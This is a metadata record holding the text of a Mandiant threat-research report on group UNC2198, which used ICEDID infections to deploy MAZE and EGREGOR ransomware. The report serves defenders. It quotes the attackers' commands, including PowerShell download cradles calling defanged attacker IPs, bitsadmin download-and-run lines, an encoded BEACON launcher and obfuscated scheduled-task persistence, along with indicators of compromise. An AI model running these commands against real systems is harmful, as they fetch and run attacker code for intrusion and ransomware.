{
    "id": "002e4923-4b7e-470e-993c-bf55eb57c6a3",
    "created_at": "2023-01-12T15:04:21.890305Z",
    "updated_at": "2025-03-27T02:13:58.340265Z",
    "deleted_at": null,
    "sha1_hash": "666350a941b7f8cbe99971e51836575e3f55c95d",
    "title": "2021-02-25 - So Unchill Melting UNC2198 ICEDID to Ransomware Operations",
    "authors": "",
    "file_creation_date": "2022-05-25T14:37:52Z",
    "file_modification_date": "2022-05-25T14:37:52Z",
    "file_size": 647682,
    "plain_text": "# So Unchill: Melting UNC2198 ICEDID to Ransomware Operations\n\n**[mandiant.com/resources/melting-unc2198-icedid-to-ransomware-operations](https://www.mandiant.com/resources/melting-unc2198-icedid-to-ransomware-operations)**\n\nThreat Research\n\nBryce Abdo, Brendan McKeague, Van Ta\n\nFeb 25, 2021\n\n16 mins read\n\nRansomware\n\nUncategorized Groups (UNC Groups)\n\nThreat Research\n\nMandiant Advanced Practices (AP) closely tracks the shifting tactics, techniques, and procedures (TTPs) of financially\nmotivated groups who severely disrupt organizations with ransomware. In May 2020, FireEye released a blog post\ndetailing intrusion tradecraft associated with the deployment of MAZE. As of publishing this post, we track 11 distinct\ngroups that have deployed MAZE ransomware. At the close of 2020, we noticed a shift in a subset of these groups that\nhave started to deploy EGREGOR ransomware in favor of MAZE ransomware following access acquired from ICEDID\ninfections.\n\nSince its discovery in 2017 as a banking trojan, ICEDID evolved into a pernicious point of entry for financially motivated\nactors to conduct intrusion operations. In earlier years, ICEDID was deployed to primarily target banking credentials. In\n2020 we observed adversaries using ICEDID more explicitly as a tool to enable access to impacted networks, and in\nmany cases this was leading to the use of common post-exploitation frameworks and ultimately the deployment of\nransomware. This blog post shines a heat lamp on the latest tradecraft of UNC2198, whoused ICEDID infections to\ndeploy MAZE or EGREGOR ransomware.\n\n**Building an Igloo: ICEDID Infections**\n\nSeparate phases of intrusions are attributed to different uncategorized (UNC) groups when discrete operations such as\nobtaining access are not part of a contiguous operation. Pure “access operations” establish remote access into a target\nenvironment for follow on operations actioned by a separate group. A backdoor deployed to establish an initial foothold\nfor another group is an example of an access operation.\n\nBetween July and December 2020, an ICEDID phishing infection chain consisted of a multi-stage process involving\nMOUSEISLAND and PHOTOLOADER (Figure 1).\n\n\n-----\n\nFigure 1: Example UNC2420 MOUSEISLAND to ICEDID Infection Chain\n\nMOUSEISLAND is a Microsoft Word macro downloader used as the first infection stage and is delivered inside a\npassword-protected zip attached to a phishing email (Figure 2). Based on our intrusion data from responding to ICEDID\nrelated incidents, the secondary payload delivered by MOUSEISLAND has been PHOTOLOADER, which acts as an\nintermediary downloader to install ICEDID. Mandiant attributes the MOUSEISLAND distribution of PHOTOLOADER\n[and other payloads to UNC2420, a distribution threat cluster created by Mandiant’s Threat Pursuit team. UNC2420](https://advantage.mandiant.com/actors/threat-actor--843f8aa0-2305-579a-a08a-f2f88f7815d1)\nactivity shares overlaps with the publicly reported nomenclature of “Shathak” or “TA551”.\n\nFigure 2: UNC2420 MOUSEISLAND Phishing Email\n\n**Ice, Ice, BEACON...UNC2198**\n\nAlthough analysis is always ongoing, at the time of publishing this blog post, Mandiant tracks multiple distinct threat\nclusters (UNC groups) of various sizes that have used ICEDID as a foothold to enable intrusion operations. The most\n[prominent of these threat clusters is UNC2198, a group that has targeted organizations in North America across a](https://advantage.mandiant.com/actors/threat-actor--6fd29c05-9c32-578a-83d8-051f89ebf30b)\n\n\n-----\n\nbreadth of industries. In at least five cases, UNC2198 acquired initial access from UNC2420 MOUSEISLAND to conduct\nintrusion operations. In 2020, Mandiant attributed nine separate intrusions to UNC2198. UNC2198’s objective is to\nmonetize their intrusions by compromising victim networks with ransomware.In July 2020, Mandiant observed\nUNC2198 leverage network access provided by an ICEDID infection to encrypt an environment with MAZE ransomware.\nAs the year progressed into October and November, we observed UNC2198 shift from deploying MAZE to using\nEGREGOR ransomware during another Incident Response engagement. Like MAZE, EGREGOR is operated using an\n[affiliate model, where affiliates who deploy EGREGOR are provided with proceeds following successful encryption and](https://advantage.mandiant.com/reports/20-00022696)\nextortion for payment.\n\n[The UNC2198 cluster expanded over the course of more than six months. Mandiant’s December 2020 blog post on UNCs](https://www.mandiant.com/resources/how-mandiant-tracks-uncategorized-threat-actors)\ndescribed the analytical tradecraft we use to merge and graduate clusters of activity. Merging UNCs is a substantial\nanalytical practice in which indicators and tradecraft attributed to one group are scrutinized against another. Two former\nUNCs that shared similar modus operandi were eventually merged into UNC2198.\n\n**The Snowball Effect of Attribution**\n\nAP created UNC2198 based on a single intrusion in June 2020 involving ICEDID, BEACON, SYSTEMBC and WINDARC.\nUNC2198 compromised 32 systems in 26 hours during this incident; however, ransomware was not deployed.\nThroughout July 2020 we attributed three intrusions to UNC2198 from Incident Response engagements, including one\nresulting in the deployment of MAZE ransomware. In October 2020, a slew of activity at both Incident Response\nengagements and Managed Defense clients resulted in the creation of two new UNC groups, and another incident\nattributed to UNC2198.\n\nOne of the new UNC groups created in October 2020 was given the designation UNC2374. UNC2374 began as its own\ndistinct cluster where BEACON, WINDARC, and SYSTEMBC were observed during an incident at a Managed Defense\ncustomer. Initial similarities in tooling did not constitute a strong enough link to merge UNC2374 with UNC2198 yet.\n\nTwo and a half months following the creation of UNC2374, we amassed enough data points to merge UNC2374 into\nUNC2198. Some of the data points used in merging UNC2374 into UNC2198 include:\n\nUNC2198 and UNC2374 Cobalt Strike Team Servers used self-signed certificates with the following subject on TCP\nport 25055:\n\nC = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com\n\nUNC2198 and UNC2374 deployed WINDARC malware to identical file paths: %APPDATA%\\teamviewers\\msi.dll\nThe same code signing certificate used to sign an UNC2198 BEACON loader was used to sign two UNC2374\nSYSTEMBC tunneler payloads.\nUNC2374 and UNC2198 BEACON C2 servers were accessed by the same victim system within a 10-minute time\nwindow during intrusion operations.\n\nThe other UNC group created in October 2020 was given the designation UNC2414. Three separate intrusions were\nattributed to UNC2414, and as the cluster grew, we surfaced similarities between UNC2414 and UNC2198. A subset of\nthe data points used to merge UNC2414 into UNC2198 include:\n\nUNC2198 and UNC2414 BEACON servers used self-signed certificates using the following subject on TCP port\n25055:\n\nC = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com\n\nUNC2198 and UNC2414 installed BEACON as C:\\Windows\\int32.dll\nUNC2198 and UNC2414 installed the RCLONE utility as C:\\Perflogs\\rclone.exe\nUNC2198 and UNC2414 were proven to be financially motivated actors that had leveraged ICEDID as initial access:\n\nUNC2198 had deployed MAZE\nUNC2414 had deployed EGREGOR\n\n\n-----\n\nThe merge between UNC2198 and UNC2414 was significant because it revealed UNC2198 has access to EGREGOR\n[ransomware. The timing of the EGREGOR usage is also consistent with MAZE ransomware shutting down as reported by](https://advantage.mandiant.com/reports/20-00022696)\nMandiant Intelligence. Figure 3 depicts the timeline of related intrusions and merges into UNC2198.\n\nFigure 3: UNC2198 timeline\n\n**UNC2198 Intrusion Flow: After Initial Access**\n\nExpanding the UNC2198 cluster through multiple intrusions and merges with other UNC groups highlights the range of\nTTPs employed. We have pulled out some key data from all our UNC2198 intrusions to illustrate an amalgamation of\ncapabilities used by the threat actor.\n\n_Establish Foothold_\n\nAfter obtaining access, UNC2198 has deployed additional malware using various techniques. For instance, UNC2198\nused InnoSetup droppers to install a WINDARC backdoor on the target host. UNC2198 also used BITS Jobs and remote\nPowerShell downloads to download additional tools like SYSTEMBC for proxy and tunneler capabilities. Example\ncommands for download and execution are:\n\n%COMSPEC% /C echo bitsadmin /transfer 257e http://<REDACTED>/<REDACTED>.exe %APPDATA%\n<REDACTED>.exe & %APPDATA%<REDACTED>.exe & del %APPDATA% <REDACTED>.exe ^>\n%SYSTEMDRIVE%\\WINDOWS\\Temp\\FmpaXUHFennWxPIM.txt > \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat &\n%COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat\n\n%COMSPEC% /C echo powershell.exe -nop -w hidden -c (new-object\nSystem.Net.WebClient).Downloadfile(http://<REDACTED>/<REDACTED>.exe, <REDACTED>.exe) ^>\n%SYSTEMDRIVE%\\WINDOWS\\Temp\\AVaNbBXzKyxktAZI.txt > \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat &\n%COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat\n\nUNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER, KOADIC, and PowerShell EMPIREoffensive\nsecurity toolsduring this phase as well.\n\n_Offensive Security Tooling_\n\nUNC2198 has used offensive security tools similarly seen across many threat actors. UNC2198 has used BEACON in\nroughly 90% of their intrusions. UNC2198 installs and executes Cobalt Strike BEACON in a variety of ways, including\nshellcode loaders using PowerShell scripts, service executables, and DLLs. While the ways and means of using BEACON\nare not inherently unique, there are still aspects to extrapolate that shed light on UNC2198 TTPs.\n\nFocusing in on specific BEACON executables tells a different story beyond the use of the tool itself. Aside from junk code\nand API calls, UNC2198 BEACON and METERPRETER executables often exhibit unique characteristics of malware\npackaging, including odd command-line arguments visible within strings and upon execution via child processes:\n\n\n-----\n\ncmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\\SOFTWARE\\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t\nREG_DWORD /d 3045 & exit\n\ncmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\\\SOFTWARE\\\\YkUJvbgwtylk /v KYIaIoYxqwO /t\nREG_DWORD /d 9633 & exit\n\ncmd.exe /c set XlOLqhCejHbSNW=8300 & reg add HKCU\\SOFTWARE\\WaMgGneKhtgTTy /v LbmWADsevLywrkP /t\nREG_DWORD /d 3809 & exit\n\nThese example commands are non-functional, as they do not modify or alter payload execution.\n\nAnother technique involves installing BEACON using a file path containing mixed Unicode-escaped and ASCII\ncharacters to evade detection:\n\n**Unicode Escaped** C:\\ProgramData\\S\\u0443sH\\u0435\\u0430ls\\T\\u0430s\\u0441host.exe\n\n**Unicode Unescaped** C:\\ProgramData\\SуsHеаls\\Tаsсhost.exe\n\nThe executable was then executed by using a Scheduled Task named shadowdev:\n\ncmd.exe /c schtasks /create /sc minute /mo 1 /tn shadowdev /tr\nC:\\\\ProgramData\\\\S\\u0443sH\\u0435\\u0430ls\\\\T\\u0430s\\u0441host.exe\n\nWhile the previous examples are related to compiled executables, UNC2198 has also used simple PowerShell download\ncradles to execute Base64-encoded and compressed BEACON stagers in memory:\n\npowershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://5.149.253[.]199:80/auth'))\n\npowershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\"hxxp://185.106.122[.]167:80/a\"))\n\npowershell.exe -nop -w hidden -c \"IEX ((new-object\nnet.webclient).downloadstring('hxxp://195.123.233[.]157:80/casino'))\"\n\n_Discovery and Reconnaissance_\n\nUNC2198 has exhibited common TTPs seen across many threat groups during discovery and reconnaissance activities.\nUNC2198 has used the BloodHound active directory mapping utilityduring intrusions from within the “C:\\ProgramData”\nand “C:\\Temp” directories.\n\nThe following are collective examples of various commands executed by UNC2198 over time to enumerate a\ncompromised environment:\n\narp -a\n\nwhoami /groups\n\nwhoami.exe /groups /fo csv\n\nwhoami /all\n\nnet user <Redacted>\n\nnet groups \"Domain Admins\" /domain\n\nnet group \"Enterprise admins\" /domain\n\nnet group \"local admins\" /domain\n\nnet localgroup \"administrators\" /domain\n\nnltest /domain_trusts\n\nnltest /dclist:<Redacted>\n\n\n-----\n\n**Lateral Movement and Privilege Escalation**\n\nUNC2198 has used Windows Remote Management and RDP to move laterally between systems. UNC2198 has also\nperformed remote execution of BEACON service binaries on targeted systems to move laterally. UNC2198 launches SMB\nBEACON using PowerShell, executing command lines such as the following:\n\nC:\\WINDOWS\\system32\\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand\nJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALAB\n\nbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AH\n\nMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwA3ADIALw...<Truncated>\n\nDuring one intrusion, UNC2198 used the SOURBITS privilege escalation utility to execute files on a target system.\n[SOURBITS is a packaged exploit utility for CVE-2020-0787, which is a vulnerability that was disclosed in 2020 for](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0787)\n_Windows Background Intelligent Transfer Service (BITS). SOURBITS consists of code derived from a GitHub_\nRepository that is implemented as a command-line utility, which can execute arbitrary files with elevated privileges.\nUNC2198 used SOURBITS with the following components:\n\nC:\\Users\\<User>\\Downloads\\runsysO.cr\n\nC:\\Users\\<User>\\Downloads\\starterO.exe\n\nThe file runsysO.cr is an XOR-encoded PE executable that exploits CVE-2020-0787, and based on the target system's\nbitness, it will drop one of two embedded SOURBITS payloads.\n\n_Data Theft, Ransomware Deployment and #TTR_\n\nLike other financially motivated threat actors, part of UNC2198’s modus operandi in latter stages of intrusions involves\nthe exfiltration of hundreds of gigabytes of the victim organizations’ data before ransomware is installed. Specifically,\nUNC2198 has used RCLONE, a command line utility used to synchronize cloud storage, to aid in the exfiltration of\nsensitive data. In all observed cases of data theft, RCLONE was used by UNC2198 from the “C:\\PerfLogs\\rclone.exe” file\npath.\n\n“Time-to-Ransom\" (TTR) is the delta between first-attributed access time and the time of ransomware deployment. TTR\nserves as a useful gauge of how quickly an organization needs to respond to stave off a threat actor’s successful\ndeployment of ransomware. TTR is not a perfect quantification, as external factors such as an organization’s security\nposture can drastically affect the measurement.\n\nIn this post, the TTR of UNC2198 is measured between ICEDID activity to the deployment of ransomware. In July 2020,\nUNC2198 deployed MAZE ransomware using PSEXEC, and the TTR was 5.5 days. In October 2020, UNC2198 deployed\nEGREGOR ransomware using forced GPO updates, and the TTR was 1.5 days.\n\n**Looking Forward**\n\nThreat actors leveraging access obtained through mass malware campaigns to deploy ransomware is a growing trend.\nThe efficiency of ransomware groups places a significant burden on defenders to rapidly respond before ransomware\ndeployment. As ransomware groups continue to gain operational expertise through successful compromises, they will\ncontinue to shorten their TTR while scaling their operations. Understanding the TTPs fundamental to a specific\noperation like UNC2198 provides an edge to defenders in their response efforts. Our unparalleled understanding of\n[groups like UNC2198 is translated into Mandiant Advantage. Accessing our holdings in Mandiant Advantage aids](https://www.mandiant.com/advantage/threat-intelligence)\ndefenders in recognizing TTPs used by threat actors, assessing organizational risk, and taking action. Initial investments\nmade into rapidly assessing a group’s modus operandi pays dividends when they inevitably evolve and swap out\ncomponents of their toolset. Whether it be MAZE or EGREGOR, something icy or hot, Advanced Practices will continue\nto pursue these unchill threat actors.\n\n**Acknowledgements**\n\n\n-----\n\nThank you to Dan Perez, Andrew Thompson, Nick Richard, Cian Lynch and Jeremy Kennelly for technical review of this\ncontent. In addition, thank you to Mandiant frontline responders for harvesting the valuable intrusion data that enables\nour research.\n\n**Appendix: Malware Families**\n\n[PHOTOLOADER is a downloader that has been observed to download ICEDID. It makes an HTTP request for a fake](https://advantage.mandiant.com/malware/malware--badb174b-5bbb-51cb-91de-615dd4a54198)\nimage file, which is RC4 decrypted to provide the final payload. Host information is sent to the command and control\n(C2) via HTTP cookies. Samples have been observed to contain an embedded C2 configuration that contain the real C2\nwith a number of non-malicious domains. The non-malicious domains are contacted in addition to the real C2.\n\n[WINDARC is a backdoor that hijacks the execution of TeamViewer to perform C2 communication. It supports plugins](https://advantage.mandiant.com/malware/malware--5f584191-7903-55f9-8a3d-c1b4528e18be)\nand accepts several backdoor commands. The commands include interacting with the TeamViewer tool, starting a\nreverse shell, loading new plugins, downloading and executing files, and modifying configuration settings.\n\n[SYSTEMBC is a proxy malware that beacons to its C2 and opens new proxy connections between the C2 and remote](https://advantage.mandiant.com/malware/malware--17784955-af55-5462-877f-feaba0c8d80a)\nhosts as indicated by the C2. Proxied communications are encrypted with RC4. The malware receives commands via\nHTTP and creates new proxy connections as directed. Underground sales advertisements refer to the software as a\n“socks5 backconnect system”. The malware is typically used to hide the malicious traffic associated with other malware.\n\n**Appendix: Detecting the Techniques**\n\nFireEye security solutions detect these threats across email, endpoint, and network levels. The following is a snapshot of\nexisting detections related to activity outlined in this blog post.\n\n**Platform** **Detection Name**\n\nFireEye Network Security Downloader.Macro.MOUSEISLAND\nDownloader.Win.PHOTOLOADER\nTrojan.PHOTOLOADER\nDownloader.IcedID\nTrojan.IcedID\nMalicious.SSL.IcedID\nMalicious.SSL.IcedIdCert\nTrojan.Malicious.Certificate\nBackdoor.BEACON\nTrojan.Generic\nTrojan.CobaltStrike\n\n\n-----\n\nFireEye Endpoint Security **Real-Time (IOC)**\n\nBLOODHOUND ATTACK PATH MAPPING (UTILITY)\nBLOODHOUND ATTACK PATH MAPPING A (UTILITY)\nCOBALT STRIKE (BACKDOOR)\nCOBALT STRIKE DEFAULT DLL EXPORT (BACKDOOR)\nCOBALT STRIKE NAMED PIPE ECHO (BACKDOOR)\nEGREGOR RANSOMWARE (FAMILY)\nICEDID (FAMILY)\nMAZE RANSOMWARE (FAMILY)\nMAZE RANSOMWARE A (FAMILY)\nMETASPLOIT SERVICE ABUSE (UTILITY)\nMOUSEISLAND (DOWNLOADER)\nMOUSEISLAND A (DOWNLOADER)\nMOUSEISLAND B (DOWNLOADER)\nPOWERSHELL DOWNLOADER (METHODOLOGY)\nPOWERSHELL DOWNLOADER D (METHODOLOGY)\nSCHTASK CREATION FROM PROGRAMDATA (COLLECTION)\nSUSPICIOUS BITSADMIN USAGE A (METHODOLOGY)\nSUSPICIOUS POWERSHELL USAGE (METHODOLOGY)\nWMIC SHADOWCOPY DELETE (METHODOLOGY)\n\n**Malware Protection (AV/MG)**\n\nSYSTEMBC\nTrojan.EmotetU.Gen.*\nTrojan.Mint.Zamg.O\nGeneric.mg.*\nICEID\nGen:Variant.Razy.*\nGeneric.mg.*\nBEACON\nGen:Trojan.Heur.TP.TGW@bug909di\nGen:Variant.Bulz.1217\nTrojan.GenericKD.34797730\nGeneric.mg.*\n\n**Appendix: Indicators**\n\n95b78f4d3602aeea4f7a33c9f1b49a97 SYSTEMBC\n\n0378897e4ec1d1ee4637cff110635141 SYSTEMBC\n\nc803200ad4b9f91659e58f0617f0dafa SYSTEMBC\n\nad4d445091a3b66af765a1d653fd1eb7 SYSTEMBC\n\n9ecf25b1e9be0b20822fe25269fa5d02 SYSTEMBC\n\ne319f5a8fe496c0c8247e27c3469b20d SYSTEMBC\n\na8a7059278d82ce55949168fcd1ddde4 SYSTEMBC\n\naea530f8a0645419ce0abe1bf2dc1584 SYSTEMBC\n\n3098fbc98e90d91805717d7a4f946c27 SYSTEMBC\n\n\n-----\n\n45.141.84.212:4132 SYSTEMBC\n\n45.141.84.223:4132 SYSTEMBC\n\n79.141.166.158:4124 SYSTEMBC\n\n149.28.201.253:4114 SYSTEMBC\n\n193.34.167.34:80 BEACON\n\n195.123.240.219:80 BEACON\n\n23.227.193.167:80 BEACON\n\n5.149.253.199:80 BEACON\n\ne124cd26fcce258addc85d7f010655ea BEACON\n\n7ae990c12bf5228b6d1b90d40ad0a79f BEACON\n\n3eb552ede658ee77ee4631d35eac6b43 BEACON\n\nc188c6145202b65a941c41e7ff2c9afd BEACON\n\n2f43055df845742d137a18b347f335a5 BEACON\n\n87dc37e0edb39c077c4d4d8f1451402c ICEDID\n\n1efababd1d6bd869f005f92799113f42 ICEDID\n\na64e7dd557e7eab3513c9a5f31003e68 ICEDID\n\n9760913fb7948f2983831d71a533a650 ICEDID\n\n14467102f8aa0a0d95d0f3c0ce5f0b59 ICEDID\n\ncolombosuede.club ICEDID\n\ncolosssueded.top ICEDID\n\ngolddisco.top ICEDID\n\njune85.cyou ICEDID\n\n**Appendix: Mandiant Security Validation Actions**\n\n[Organizations can validate their security controls against more than 60 actions with Mandiant Security Validation.](https://www.mandiant.com/advantage/security-validation)\n\n\n-----\n\n**VID** **Name**\n\nA101-509 Phishing Email - Malicious Attachment, MOUSEISLAND, Macro Based Downloader\n\nA150-326 Malicious File Transfer - MOUSEISLAND, Download, Variant #1\n\nA150-433 Malicious File Transfer - MOUSEISLAND, Download, Variant #2\n\nA101-282 Malicious File Transfer - MOUSEISLAND Downloader, Download\n\nA104-632 Protected Theater - MOUSEISLAND Downloader, Execution\n\nA101-266 Command and Control - MOUSEISLAND, HTTP GET Request for PHOTOLOADER\n\nA101-280 Malicious File Transfer - PHOTOLOADER, Download\n\nA101-263 Command and Control - PHOTOLOADER, DNS Query #1\n\nA101-281 Malicious File Transfer - ICEDID Stage 3, Download\n\nA101-279 Malicious File Transfer - ICEDID Final Payload, Download\n\nA101-265 Command and Control - ICEDID, DNS Query #1\n\nA101-264 Command and Control - ICEDID, DNS Query #2\n\nA101-037 Malicious File Transfer - MAZE, Download, Variant #1\n\nA101-038 Malicious File Transfer - MAZE, Download, Variant #2\n\nA101-039 Malicious File Transfer - MAZE, Download, Variant #3\n\nA101-040 Malicious File Transfer - MAZE, Download, Variant #4\n\nA101-041 Malicious File Transfer - MAZE, Download, Variant #5\n\nA101-042 Malicious File Transfer - MAZE, Download, Variant #6\n\nA101-043 Malicious File Transfer - MAZE, Download, Variant #7\n\nA101-044 Malicious File Transfer - MAZE, Download, Variant #8\n\nA101-045 Malicious File Transfer - MAZE, Download, Variant #9\n\nA100-878 Command and Control - MAZE Ransomware, C2 Check-in\n\n\n-----\n\nA101-030 Command and Control - MAZE Ransomware, C2 Beacon, Variant #1\n\nA101-031 Command and Control - MAZE Ransomware, C2 Beacon, Variant #2\n\nA101-032 Command and Control - MAZE Ransomware, C2 Beacon, Variant #3\n\nA104-734 Protected Theater - MAZE, PsExec Execution\n\nA104-487 Protected Theater - MAZE Ransomware, Encoded PowerShell Execution\n\nA104-485 Protected Theater - MAZE Ransomware Execution, Variant #1\n\nA104-486 Protected Theater - MAZE Ransomware Execution, Variant #2\n\nA104-491 Host CLI - MAZE, Create Target.lnk\n\nA104-494 Host CLI - MAZE, Dropping Ransomware Note Burn Directory\n\nA104-495 Host CLI - MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.html Variant\n\nA104-496 Host CLI - MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.txt Variant\n\nA104-498 Host CLI - MAZE, Desktop Wallpaper Ransomware Message\n\nA150-668 Malicious File Transfer - EGREGOR, Download\n\nA101-460 Command and Control - EGREGOR, GET DLL Payload\n\nA150-675 Protected Theater - EGREGOR, Execution, Variant #1\n\nA101-271 Malicious File Transfer - BEACON, Download, Variant #1\n\nA150-610 Malicious File Transfer - BEACON, Download\n\nA150-609 Command and Control - BEACON, Check-in\n\nA104-732 Protected Theater - BEACON, Mixed Unicode-Escaped and ASCII Characters Execution\n\nA101-514 Malicious File Transfer - WINDARC, Download, Variant #1\n\nA100-072 Malicious File Transfer - SYSTEMBC Proxy, Download\n\nA100-886 Malicious File Transfer - Rclone.exe, Download\n\nA100-880 Malicious File Transfer - Bloodhound Ingestor C Sharp Executable Variant, Download\n\n\n-----\n\nA100-881 Malicious File Transfer - Bloodhound Ingestor C Sharp PowerShell Variant, Download\n\nA100-882 Malicious File Transfer - Bloodhound Ingestor PowerShell Variant, Download\n\nA100-877 Active Directory - BloodHound, CollectionMethod All\n\nA101-513 Malicious File Transfer - SOURBITS, Download, Variant #1\n\nA104-733 Protected Theater - CVE-2020-0787, Arbitrary File Move\n\nA100-353 Command and Control - KOADIC Agent (mshta)\n\nA100-355 Command and Control - Multiband Communication using KOADIC\n\nA104-088 Host CLI - Timestomp W/ PowerShell\n\nA104-277 Host CLI - EICAR COM File Download via PowerShell\n\nA104-281 Host CLI - EICAR TXT File Download via PowerShell\n\nA104-664 Host CLI - EICAR, Download with PowerShell\n\nA150-054 Malicious File Transfer - EMPIRE, Download\n\nA100-327 Command and Control - PowerShell Empire Agent (http)\n\nA100-328 Lateral Movement, Execution - PsExec\n\nA100-498 Scanning Activity - TCP Port Scan for Open RDP\n\nA100-502 Scanning Activity - UDP Port Scan for Open RDP\n\nA100-316 Lateral Movement - PSSession and WinRM\n\nA104-081 Host CLI - Mshta\n\n**Appendix: UNC2198 MITRE ATT&CK Mapping**\n\n**ATT&CK Tactic Category** **Techniques**\n\n\n-----\n\nResource Development Acquire Infrastructure (T1583)\n\nVirtual Private Server (T1583.003)\n\nDevelop Capabilities (T1587)\n\nDigital Certificates (T1587.003)\n\nObtain Capabilities (T1588)\n\nCode Signing Certificates (T1588.003)\nDigital Certificates (T1588.004)\n\nInitial Access Phishing (T1566)\n\nSpearphishing Attachment (T1566.001)\n\nExternal Remote Services (T1133)\n\nValid Accounts (T1078)\n\nExecution Command and Scripting Interpreter (T1059)\n\nPowerShell (T1059.001)\nVisual Basic (T1059.005)\nWindows Command Shell (T1059.003)\n\nScheduled Task/Job (T1053)\n\nScheduled Task (T1053.005)\n\nSystem Services (T1569)\n\nService Execution (T1569.002)\n\nUser Execution (T1204)\n\nMalicious File (T1204.002)\n\nWindows Management Instrumentation (T1047)\n\nPersistence External Remote Services (T1133)\n\nScheduled Task/Job (T1053)\n\nScheduled Task (T1053.005)\n\nValid Accounts (T1078)\n\nPrivilege Escalation Process Injection (T1055)\n\nScheduled Task/Job (T1053)\n\nScheduled Task (T1053.005)\n\nValid Accounts (T1078)\n\n\n-----\n\nDefense Evasion Impair Defenses (T1562)\n\nDisable or Modify System Firewall (T1562.004)\nDisable or Modify Tools (T1562.001)\n\nIndicator Removal on Host (T1070)\n\nTimestomp (T1070.006)\n\nIndirect Command Execution (T1202)\n\nModify Registry (T1112)\n\nObfuscated Files or Information (T1027)\n\nSteganography (T1027.003)\n\nProcess Injection (T1055)\n\nSigned Binary Proxy Execution (T1218)\n\nMshta (T1218.005)\n\nSubvert Trust Controls (T1553)\n\nCode Signing (T1553.002)\n\nValid Accounts (T1078)\n\nVirtualization/Sandbox Evasion (T1497)\n\nCredential Access OS Credential Dumping (T1003)\n\nDiscovery Account Discovery (T1087)\n\nLocal Account (T1087.001)\n\nDomain Trust Discovery (T1482)\n\nFile and Directory Discovery (T1083)\n\nPermission Groups Discovery (T1069)\n\nSystem Information Discovery (T1082)\n\nSystem Network Configuration Discovery (T1016)\n\nSystem Owner/User Discovery (T1033)\n\nVirtualization/Sandbox Evasion (T1497)\n\nLateral Movement Remote Services (T1021)\n\nRemote Desktop Protocol (T1021.001)\nSMB/Windows Admin Shares (T1021.002)\nSSH (T1021.004)\n\nCollection Archive Collected Data (T1560)\n\nArchive via Utility (T1560.001)\n\n\n-----\n\nCommand and Control Application Layer Protocol (T1071)\n\nWeb Protocols (T1071.001)\n\nEncrypted Channel (T1573)\n\nAsymmetric Cryptography (T1573.002)\n\nIngress Tool Transfer (T1105)\n\nProxy (T1090)\n\nMulti-hop Proxy (T1090.003)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-25 - So Unchill Melting UNC2198 ICEDID to Ransomware Operations.pdf"
    ],
    "report_names": [
        "2021-02-25 - So Unchill Melting UNC2198 ICEDID to Ransomware Operations.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3c864b3-fac9-4d56-8500-7c06c829fbf8",
            "created_at": "2023-01-06T13:46:39.071873Z",
            "updated_at": "2025-03-27T02:00:02.990045Z",
            "deleted_at": null,
            "main_name": "TA2101",
            "aliases": [
                "Storm-0216",
                "DEV-0216",
                "UNC2198",
                "Maze Team",
                "TWISTED SPIDER",
                "GOLD VILLAGE"
            ],
            "source_name": "MISPGALAXY:TA2101",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
